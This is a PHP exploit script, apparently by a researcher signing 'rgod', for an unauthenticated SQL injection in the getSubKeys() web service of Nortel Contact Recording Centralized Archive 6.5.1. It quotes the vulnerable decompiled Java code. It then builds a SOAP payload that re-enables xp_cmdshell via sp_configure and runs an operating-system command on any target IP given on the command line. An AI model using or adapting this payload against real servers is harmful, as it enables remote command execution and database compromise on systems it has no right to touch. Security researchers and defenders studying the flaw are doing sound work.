&lt;?php
/*
Nortel Contact Recording Centralized Archive 6.5.1 EyrAPIConfiguration
Web Service getSubKeys() Remote SQL Injection Exploit
 
tested against:
Microsoft Windows Server 2003 r2 sp2
Microsoft SQL Server 2005 Express
 
download uri:
ftp://ftp.avaya.com/incoming/Up1cku9/tsoweb/web1/software/c/contactcenter/crqm/6_5_CS1K_2/Nortel-DVD3-Archive-6_5.iso
 
background:
 
This software installs a Tomcat http server which listens on
port 8080 for incoming connections. It exposes the
following servlet as declared inside
c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\web.xml :
 
...
   &lt;servlet-mapping&gt;
      &lt;servlet-name&gt;EyrAPIConfiguration&lt;/servlet-name&gt;
      &lt;url-pattern&gt;/EyrAPIConfiguration/*&lt;/url-pattern&gt;
   &lt;/servlet-mapping&gt;
...
 
at the following url:
 
http://[host]:8080/EyrAPI/EyrAPIConfiguration/EyrAPIConfigurationIf
 
 
Vulnerability:
 
without prior authentication, you can reach a web service
with various methods availiable, as described inside
the associated wsdl, see file:
 
c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\classes\EyrAPIConfiguration.wsdl
 
among them, the getSubKeys() method.
 
Now look at getSubKeys() inside the decompiled
c:\Program Files\[choosen folder]\Tomcat5\webapps\EyrAPI\WEB-INF\classes\com\eyretel\eyrapi\EyrAPIConfigurationImpl.class
 
:
...
 public String getSubKeys(boolean iterateSubKeys, boolean includeValues, String systemId, String componentId, String sysCompId, String userName)
        throws RemoteException
    {
        StringBuffer xml;
        ConfigOwnerId configOwnerId;
        Connection conn;
        PreparedStatement pStmt;
        ResultSet rs;
        PreparedStatement pStmt2;
        ResultSet rs2;
        log.info((new StringBuilder()).append(&quot;Request getSubKeys: iterateSubKeys=&quot;).append(iterateSubKeys).append(&quot;, includeValues=&quot;).append(includeValues).append(&quot;, SystemId=&quot;).append(systemId).append(&quot;, componentId=&quot;).append(componentId).append(&quot;, sysCompId=&quot;).append(sysCompId).append(&quot;, userName=&quot;).append(userName).toString());
        xml = new StringBuffer(&quot;&lt;ConfigurationNodeList&gt;&quot;);
        configOwnerId = null;
        conn = null;
        pStmt = null;
        rs = null;
        pStmt2 = null;
        rs2 = null;
        try
        {
            conn = SiteDatabase.getInstance().getConnection();
            if(EyrAPIProperties.getInstance().getProperty(&quot;database&quot;, &quot;MSSQLServer&quot;).equalsIgnoreCase(&quot;Oracle&quot;))
            {
                if(componentId.compareToIgnoreCase(&quot;&quot;) == 0)
                    componentId = &quot;*&quot;;
                if(systemId.compareToIgnoreCase(&quot;&quot;) == 0)
                    systemId = &quot;*&quot;;
                if(sysCompId.compareToIgnoreCase(&quot;&quot;) == 0)
                    sysCompId = &quot;*&quot;;
                if(userName.compareToIgnoreCase(&quot;&quot;) == 0)
                    userName = &quot;*&quot;;
                pStmt = conn.prepareStatement((new StringBuilder()).append(&quot;SELECT ConfigOwnerID FROM ConfigOwnerView WHERE nvl(ComponentID, &#039;*&#039;) = &#039;&quot;).append(componentId).append(&quot;&#039; AND &quot;).append(&quot;nvl(SystemID, &#039;*&#039;) = &#039;&quot;).append(systemId).append(&quot;&#039; AND &quot;).append(&quot;nvl(SysCompID, &#039;*&#039;) = &#039;&quot;).append(sysCompId).append(&quot;&#039; AND &quot;).append(&quot;nvl(UserName, &#039;*&#039;) = &#039;&quot;).append(userName).append(&quot;&#039;&quot;).toString());
                rs = pStmt.executeQuery();
            } else
            {
                pStmt = conn.prepareStatement((new StringBuilder()).append(&quot;SELECT ConfigOwnerID FROM ConfigOwnerView WHERE ISNULL(CONVERT(varchar(36), ComponentID), &#039;&#039;) = &#039;&quot;).append(unpunctuate(componentId)).append(&quot;&#039; AND &quot;).append(&quot;ISNULL(CONVERT(varchar(36), SystemID), &#039;&#039;) = &#039;&quot;).append(unpunctuate(systemId)).append(&quot;&#039; AND &quot;).append(&quot;ISNULL(CONVERT(varchar(36), SysCompID), &#039;&#039;) = &#039;&quot;).append(unpunctuate(sysCompId)).append(&quot;&#039; AND &quot;).append(&quot;ISNULL(UserName, &#039;&#039;) = &#039;&quot;).append(unpunctuate(userName)).append(&quot;&#039;&quot;).toString());
                rs = pStmt.executeQuery();
            }
            if(rs.next())
            {
                String strConfigOwnerId = rs.getString(1);
                if(!rs.wasNull())
                    configOwnerId = new ConfigOwnerId(strConfigOwnerId);
                pStmt2 = conn.prepareStatement((new StringBuilder()).append(&quot;SELECT ConfigGroupID, ConfigGroupName FROM ConfigGroupView WHERE ConfigOwnerID = &#039;&quot;).append(configOwnerId.toString()).append(&quot;&#039;&quot;).toString());
                for(rs2 = pStmt2.executeQuery(); rs2.next(); xml.append(getSubKeyValuesInc(new Integer(rs2.getInt(1)), iterateSubKeys, includeValues)));
            }
        }
        catch(SQLException e)
        {
            String msg = &quot;Unable to get subkeys&quot;;
            log.error(msg, e);
            throw new RemoteException(msg, e);
        }
        catch(GenericDatabaseException e)
        {
            String msg = &quot;Unable to get subkeys&quot;;
            log.error(msg, e);
            throw new RemoteException(msg, e);
        }
        DbHelper.closeStatement(log, pStmt);
        DbHelper.closeResultSet(log, rs);
        DbHelper.closeStatement(log, pStmt2);
        DbHelper.closeResultSet(log, rs2);
        DbHelper.closeConnection(log, conn);
        break MISSING_BLOCK_LABEL_646;
        Exception exception;
        exception;
        DbHelper.closeStatement(log, pStmt);
        DbHelper.closeResultSet(log, rs);
        DbHelper.closeStatement(log, pStmt2);
        DbHelper.closeResultSet(log, rs2);
        DbHelper.closeConnection(log, conn);
        throw exception;
        xml.append(&quot;\n&lt;/ConfigurationNodeList&gt;&quot;);
        log.info((new StringBuilder()).append(&quot;Response createKey= &quot;).append(xml).toString());
        return xml.toString();
    }
...
 
This function uses unproperly the prepareStatement() function, a SELECT query is concatenated
inside of it and using user supplied values.
 
Note also that the unpunctuate() function is unuseful to clean the passed values:
 
...
protected String unpunctuate(String id)
    {
        StringBuffer sb = new StringBuffer(id);
        try
        {
            if(sb.charAt(0) == &#039;{&#039;)
                sb.deleteCharAt(0);
        }
        catch(StringIndexOutOfBoundsException e) { }
        try
        {
            if(sb.charAt(36) == &#039;}&#039;)
                sb.deleteCharAt(36);
        }
        catch(StringIndexOutOfBoundsException e) { }
        return sb.toString();
    }
...
 
As result, a remote attacker can send a SOAP message against port 8080 containing the
getSubKeys string to execute arbitrary sql commands against the
underlying database.
 
The following code tries to execute calc.exe (if the xp_cmdshell stored procedure
is not enabled, it will try to reenable it via &#039;sp_configure&#039;, assuming you have
the privileges of the &#039;sa&#039; user), otherwise use your imagination.
 
Note: Reportedly, this product is end of sale ... so it&#039;s better you are aware of
it just in case you have an online installation exposed to user input :)
 
rgod
*/
    error_reporting(E_ALL ^ E_NOTICE);    
    set_time_limit(0);
     
    $err[0] = &quot;[!] This script is intended to be launched from the cli!&quot;;
    $err[1] = &quot;[!] You need the curl extesion loaded!&quot;;
 
    if (php_sapi_name() &lt;&gt; &quot;cli&quot;) {
        die($err[0]);
    }
     
    function syntax() {
       print(&quot;usage: php 9sg_nortel.php [ip_address]\r\n&quot; );
       die();
    }
     
    $argv[1] ? print(&quot;[*] Attacking...\n&quot;) :
    syntax();
     
    if (!extension_loaded(&#039;curl&#039;)) {
        $win = (strtoupper(substr(PHP_OS, 0, 3)) === &#039;WIN&#039;) ? true :
        false;
        if ($win) {
            !dl(&quot;php_curl.dll&quot;) ? die($err[1]) :
             print(&quot;[*] curl loaded\n&quot;);
        } else {
            !dl(&quot;php_curl.so&quot;) ? die($err[1]) :
             print(&quot;[*] curl loaded\n&quot;);
        }
    }
         
    function _s($url, $is_post, $ck, $request) {
        global $_use_proxy, $proxy_host, $proxy_port;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($is_post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $request);
        }
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            &quot;Cookie: &quot;.$ck ,
            &quot;Content-Type: text/xml&quot;
             
 
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, &quot;&quot;);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
          
        if ($_use_proxy) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy_host.&quot;:&quot;.$proxy_port);
        }
        $_d = curl_exec($ch);
        if (curl_errno($ch)) {
            //die(&quot;[!] &quot;.curl_error($ch).&quot;\n&quot;);
        } else {
            curl_close($ch);
        }
        return $_d;
    }
          $host = $argv[1];
          $port = 8080;
 
print(&quot;[*] Check for spawned calc.exe sub process.\n&quot;);
$sql=&quot;&#039;; &quot;.
     &quot;EXEC sp_configure &#039;show advanced options&#039;,1;RECONFIGURE;&quot;.
     &quot;EXEC sp_configure &#039;xp_cmdshell&#039;,1;RECONFIGURE;&quot;.
     &quot;EXEC xp_cmdshell &#039;calc&#039;;--&quot;;
$soap=&#039;&lt;soapenv:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsdl=&quot;http://com.eyretel.eyrapi.org/wsdl&quot;&gt;
   &lt;soapenv:Header/&gt;
   &lt;soapenv:Body&gt;
      &lt;wsdl:getSubKeys soapenv:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;
         &lt;boolean_1 xsi:type=&quot;xsd:boolean&quot;&gt;true&lt;/boolean_1&gt;
         &lt;boolean_2 xsi:type=&quot;xsd:boolean&quot;&gt;true&lt;/boolean_2&gt;
         &lt;String_3 xsi:type=&quot;xsd:string&quot;&gt;&#039;.$sql.&#039;&lt;/String_3&gt;
         &lt;String_4 xsi:type=&quot;xsd:string&quot;&gt;yyyy&lt;/String_4&gt;
         &lt;String_5 xsi:type=&quot;xsd:string&quot;&gt;zzzz&lt;/String_5&gt;
         &lt;String_6 xsi:type=&quot;xsd:string&quot;&gt;kkkk&lt;/String_6&gt;
      &lt;/wsdl:getSubKeys&gt;
   &lt;/soapenv:Body&gt;
&lt;/soapenv:Envelope&gt;&#039;;
$url = &quot;http://$host:$port/EyrAPI/EyrAPIConfiguration/EyrAPIConfigurationIf&quot;;
$out = _s($url, 1, &quot;&quot;, $soap);
print($out.&quot;\n&quot;);
print(&quot;[*] Done.&quot;);
?&gt;
